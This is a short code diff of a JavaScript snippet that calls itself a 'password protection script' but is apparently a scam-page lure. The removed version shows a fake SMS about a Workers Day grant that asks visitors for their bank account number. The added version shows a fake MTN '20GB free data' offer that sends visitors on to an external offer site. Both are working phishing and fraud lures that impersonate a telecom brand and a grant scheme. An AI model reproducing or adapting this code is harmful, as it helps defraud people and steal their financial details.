@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '10'
-password=prompt('SMS FG : You have been selected to benefit from the ongoing 50,000 NAIRA WORKERS DAY GRANT Enter your account number and click OK to continue ',' Enter your account number here.');
-if (password != '10') {
-location.href='https://2024-program.xyz/workersday';
+var password = '20GB FREE DATA'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB free data MTN INDEPENDENCE OFFER, Kindly press ok to ACTIVATE ','20GB FREE DATA');
+if (password != '20GB FREE DATA') {
+location.href='https://independence.valuedcosts.com/20GB';
 }
